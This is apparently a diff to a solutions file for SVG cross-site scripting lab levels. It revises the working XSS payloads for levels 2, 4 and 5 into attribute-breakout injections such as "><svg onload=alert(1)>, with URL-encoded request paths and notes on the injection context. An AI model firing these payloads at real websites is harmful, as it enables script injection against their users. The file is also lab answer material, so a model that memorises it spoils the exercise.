@@ -11,10 +11,10 @@ Reflection inside SVG event handlers, animate values, foreignObject scripts, use
 
 ### svg-xss-level2
 
-`/svg/level2/?query=alert(1)`
+`/svg/level2/?query=%22%3E%3Csvg%20onload=alert(1)%3E`
 
-- payload: `alert(1)`
-- context: query lands inside `<animate attributeName="onbegin" values="...">` — JS expression
+- payload: `"><svg onload=alert(1)>`
+- context: inside `<animate values="...">`; SMIL onbegin is dead, so break out of the value
 
 ### svg-xss-level3
 
@@ -25,17 +25,17 @@ Reflection inside SVG event handlers, animate values, foreignObject scripts, use
 
 ### svg-xss-level4
 
-`/svg/level4/?query=data:image/svg%2Bxml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4%3D`
+`/svg/level4/?query=x%22%3E%3Csvg%20onload=alert(1)%3E`
 
-- payload: `data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4=`
-- context: `<use href="...">` — external SVG via data URI; needs target click/use ref
+- payload: `x"><svg onload=alert(1)>`
+- context: inside `<use href="...">`; use never runs script, so break out
 
 ### svg-xss-level5
 
-`/svg/level5/?query=alert(1)`
+`/svg/level5/?query='%3E%3C/svg%3E%22%3E%3Csvg%20onload=alert(1)%3E`
 
-- payload: `alert(1)`
-- context: query inside `<svg onload='...'>` inside data: URI of `<embed>`
+- payload: `'></svg>"><svg onload=alert(1)>`
+- context: inside a data:image/svg+xml embed (scriptless); close it and break out of src
 
 ### svg-xss-level6
 
